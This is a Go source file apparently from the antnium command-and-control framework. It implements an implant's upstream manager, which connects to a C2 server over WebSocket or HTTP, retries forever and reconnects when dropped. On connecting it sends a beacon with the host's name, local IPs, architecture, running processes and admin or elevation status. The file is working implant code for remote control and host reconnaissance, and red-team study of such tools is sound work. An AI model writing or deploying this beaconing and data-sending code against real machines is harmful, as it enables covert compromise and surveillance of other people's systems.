package client

import (
	"math/rand"
	"strconv"
	"time"

	"github.com/dobin/antnium/pkg/arch"
	"github.com/dobin/antnium/pkg/campaign"
	"github.com/dobin/antnium/pkg/model"

	log "github.com/sirupsen/logrus"
)

// Upstreammanger makes sure there is a connection to the server via one of the upstreams
type UpstreamManager struct {
	Channel chan model.Packet

	config   *ClientConfig
	campaign *campaign.Campaign

	UpstreamHttp Upstream
	UpstreamWs   Upstream
}

func MakeUpstreamManager(config *ClientConfig, campaign *campaign.Campaign) UpstreamManager {
	upstreamHttp := MakeUpstreamHttp(config, campaign)
	upstreamWs := MakeUpstreamWs(config, campaign)

	u := UpstreamManager{
		Channel:      make(chan model.Packet),
		config:       config,
		campaign:     campaign,
		UpstreamHttp: &upstreamHttp,
		UpstreamWs:   &upstreamWs,
	}
	return u
}

// Connect will try until the C2 can be reached via a upstream.
func (d *UpstreamManager) Connect() {
	// Loop which retrieves packets from the active upstream and sends it to client
	var packet model.Packet
	var connected bool
	go func() {
		for {
			// We dont care which upstream we are connected to
			select {
			case packet, connected = <-d.UpstreamWs.ChanIncoming():
				if !connected {
					d.ReconnectWebsocket() // Blocks until we can reach server again
					continue               // We are connected again, do as before
				}
			case packet, connected = <-d.UpstreamHttp.ChanIncoming():
				// No reconnect handling atm
			}

			// Send the packet to client
			d.Channel <- packet
		}
	}()

	d.ConnectRetryForever()
}

// ConnectRetryForever will try to connect to the server, forever. Then starts upstreams
func (d *UpstreamManager) ConnectRetryForever() error {
	for {
		if d.campaign.ClientUseWebsocket {
			// Try: Websocket
			err := d.UpstreamWs.Connect()
			if err == nil {
				log.Infof("Connected to WS")
				d.UpstreamWs.Start()
				d.sendPing()
				break
			}
		} else {
			err := d.UpstreamHttp.Connect()
			if err == nil {
				log.Infof("Connected to HTTP")
				d.UpstreamHttp.Start()
				d.sendPing()
				break
			}
		}

		log.Debug("Could not connect, sleeping...")
		time.Sleep(time.Second * 3)
	}

	return nil
}

// Reconnect will destroy the currect WS upstream, and block until connected again
func (d *UpstreamManager) ReconnectWebsocket() {
	// Throw away old UpstreamWs, and try to connect again
	upstreamWs := MakeUpstreamWs(d.config, d.campaign)
	d.UpstreamWs = &upstreamWs
	log.Infof("Upstream websocket disconnectd. Retrying...")
	d.ConnectRetryForever()
}

// SendOutofBand will send a packet to the server according to a connected upstream
func (d *UpstreamManager) SendOutofband(packet model.Packet) error {
	for {
		if d.UpstreamWs.Connected() {
			d.UpstreamWs.ChanOutgoing() <- packet
			break
		} else if d.UpstreamHttp.Connected() {
			d.UpstreamHttp.ChanOutgoing() <- packet
			break
		} else {
			log.Warn("OOB: No active upstreams, sleep and try again")
			time.Sleep(time.Second * 3)
		}
	}

	return nil
}

// sendPing will send a ping message to the server
func (d *UpstreamManager) sendPing() {
	arguments := make(model.PacketArgument)

	response := make(model.PacketResponse)
	response["hostname"] = d.config.Hostname
	model.AddArrayToResponse("localIp", d.config.LocalIps, response)
	response["arch"] = d.config.Arch
	model.AddArrayToResponse("processes", d.config.Processes, response)
	isElevated, isAdmin, err := arch.GetPermissions()
	if err == nil {
		response["isElevated"] = strconv.FormatBool(isElevated)
		response["isAdmin"] = strconv.FormatBool(isAdmin)
	}

	packet := model.NewPacket("ping", d.config.ComputerId, strconv.Itoa(int(rand.Uint64())), arguments, response)
	d.SendOutofband(packet)
}
